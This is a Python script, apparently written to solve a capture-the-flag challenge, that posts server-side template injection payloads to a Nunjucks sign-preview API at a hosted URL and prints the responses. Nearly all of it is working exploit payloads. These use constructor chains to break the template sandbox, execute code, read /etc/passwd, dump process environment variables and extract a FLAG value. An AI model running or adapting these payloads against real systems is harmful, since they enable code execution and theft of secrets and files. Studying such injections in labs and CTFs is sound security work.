#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def ssti(payload):
    r = s.post(BASE + '/api/sign/preview',
               json={'lines': [payload, '', '', '']},
               timeout=20)
    try:
        data = r.json()
        return data.get('lines', [None])[0]
    except:
        return r.text[:500]

# JS template - try prototype chain to escape the sandbox
# Nunjucks sandbox escape techniques
tests = [
    # Nunjucks-specific
    "{{range.constructor('return global')()}}",
    "{{range.constructor('return process.env')()}}",
    "{{range.constructor('return require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\")')()}}",
    "{{range.constructor('return process.env.FLAG')()}}",
    "{{cycler.__init__.__globals__['os']}}",
    "{{joiner.__init__.__globals__}}",
    # Try calling constructor through allowed objects
    "{{player.constructor}}",
    "{{player.constructor.constructor}}",
    "{{player.constructor.constructor('return process.env')()}}",
    "{{player.constructor.constructor('return global.process.env')()}}",
    "{{server.constructor.constructor('return process.env')()}}",
    "{{world.constructor.constructor('return process.env')()}}",
    # Access constructor of a string result
    '{{(player.name).constructor}}',
    '{{(player.name).constructor.constructor("return process.env")()}}',
    # Math/Number
    "{{(1).constructor.constructor('return process.env')()}}",
    "{{(1).constructor.constructor('return JSON.stringify(process.env)')()}}",
    # Try filters
    "{{player.name | upper}}",
    "{{player.name | safe}}",
    "{{1 | abs}}",
    # Range / loop
    "{% for k,v in player %}{{k}}:{{v}},{% endfor %}",
    "{% for k,v in server %}{{k}}:{{v}},{% endfor %}",
    # Check what filters exist
    "{{'a' | e}}",
    "{{'a' | dump}}",
    "{{'a' | json}}",
    "{{player | dump}}",
    "{{player | json}}",
    "{{player | tojson}}",
]

for t in tests:
    r = ssti(t)
    print(f'\n{t}\n  => {str(r)[:400]}')
